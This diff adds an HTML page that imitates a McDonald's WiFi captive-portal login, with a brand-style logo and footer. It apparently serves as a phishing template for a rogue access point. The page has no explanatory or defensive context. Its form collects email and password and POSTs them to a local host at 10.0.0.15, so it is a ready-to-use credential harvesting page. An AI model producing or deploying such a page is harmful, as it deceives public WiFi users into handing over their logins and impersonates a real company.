@@ -1,0 +1,150 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <style>
+        html, body {
+            background: black;
+            height: 100vh;
+            width: 100vw;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            flex-direction: column;
+            padding: 0;
+            margin: 0;
+            overflow: hidden;
+        }
+
+        .main-app {
+            position: relative;
+
+            background: white;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            flex-direction: column;
+            height: 100%;
+            width: 100%;
+        }
+
+        .headr {
+            position: absolute;
+            top: 0;
+            left: 0;
+            color: rgb(50,50,50);
+            background: rgba(255,255,255,0.9);
+            height: 8%;
+            width: 100%;
+            display: flex;
+            justify-content: flex-start;
+            align-items: center;
+            flex-direction: row;
+        }
+
+        .mclg {
+            position: relative;
+            background: transparent;
+            width: 10%;
+            height: 100%;
+            text-align: center;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            font-size: 32px;
+            color: rgba(250,190,0,0.9);
+            font-weight: 600;
+            font-family: 'Lucida Sans', sans-serif;
+        }
+
+
+        .main-app form {
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            flex-direction: column;
+            padding: 5px;
+            margin: 5px;
+
+        }
+
+        .main-app input[type=text], .main-app input[type=password] {
+            color: grey;
+            font-size: 16px;
+            height: 44px;
+            width: 100%;
+            -webkit-appearance: none;
+            appearance: none;
+            background-color: initial;
+            border: none;
+            border-bottom: 1px solid grey;
+
+            padding: 5px;
+            margin: 5px;
+        }
+
+        .main-app input[type=submit] {
+            color: rgb(44, 44, 44);
+            font-size: 24px;
+            height: 44px;
+            width: 100%;
+            -webkit-appearance: none;
+            appearance: none;
+            background-color: rgba(250,190,0,0.9);
+            border: none;
+            cursor: pointer;
+            border-radius: 5px;
+            padding: 5px;
+            margin: 25px;
+        }
+
+        .headr-app {
+            color: black;
+            font-size: 2rem;
+            font-weight: 500;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            width: 80%;
+            text-align: center;
+        }
+
+        .footer {
+            margin-top: 20px;
+            color: rgb(60, 60, 60);
+            position: relative;
+            font-size: 12px;
+            width: 50%;
+            height: 30px;
+            display: flex;
+            text-align: center;
+            justify-content: center;
+            border: 1px solid gray;
+            padding: 20px;
+            border-radius: 5px;
+        }
+
+
+    </style>
+</head>
+<body>
+    <div class="main-app">
+        <div class="headr">
+            <div class="mclg">
+            M
+            </div>
+        </div>
+        <div class="headr-app">
+            Log in
+        </div>
+        <form method='POST' action="http://10.0.0.15:80/action.html">
+            <input type='text' name='username' placeholder="Email"/>
+            <input type='password' name='password' placeholder="Password"/>
+            <input value='Log in' type='submit'/>
+        </form>
+        <div class="footer">
+            *Log in to McDonald's app and enjoy the meal with WiFi
+
+        </div>
+    </div>
+</body>
+</html>
